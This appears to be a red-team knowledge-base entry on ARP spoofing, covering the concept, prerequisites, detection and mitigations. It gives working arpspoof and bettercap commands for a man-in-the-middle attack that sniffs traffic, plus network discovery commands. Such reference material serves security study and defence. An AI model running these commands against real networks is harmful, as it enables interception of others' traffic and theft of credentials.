---
title: ARP Spoofing
aliases: ["ARP spoof", "ARP poisoning", "ARP scan"]
type: technique
domain: [red-team]
attack_tactic: [credential-access, collection]
tags: [type/technique, domain/red-team, attack/credential-access]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[LLMNR-NBT-NS Poisoning]]", "[[DNS Attacks]]"]
created: 2026-06-06
updated: 2026-06-06
---

# ARP Spoofing

> [!summary] One-liner
> Send forged ARP replies so victims map a legitimate IP to your MAC — putting you in the middle of their traffic (MITM).

## Concept abused
**ARP** maps IP → MAC on the local segment and is **unauthenticated** — hosts trust any ARP reply, so you can poison their ARP cache.

## Prerequisites
- Same L2 segment as the targets.

## Commands & tools
```bash
# arpspoof (dsniff) - poison both directions for full MITM
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1     # tell victim we are the gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50     # tell gateway we are the victim

# bettercap (all-in-one MITM)
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on; net.sniff on"
```
**ARP scan (discovery):** `nmap -sn 192.168.1.0/24` or `arp-scan -l` / `nbtscan`.

## Detection / artifacts
Duplicate-MAC / changing ARP mappings; ARP-watch tools; gratuitous ARP floods.

## Mitigation
Dynamic ARP Inspection (DAI), static ARP for critical hosts, port security.

## Related
- Often combined with [[DNS Attacks]] (fake DNS once in the middle) or to capture creds.

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "ARP" (ARP spoof / ARP Scan)
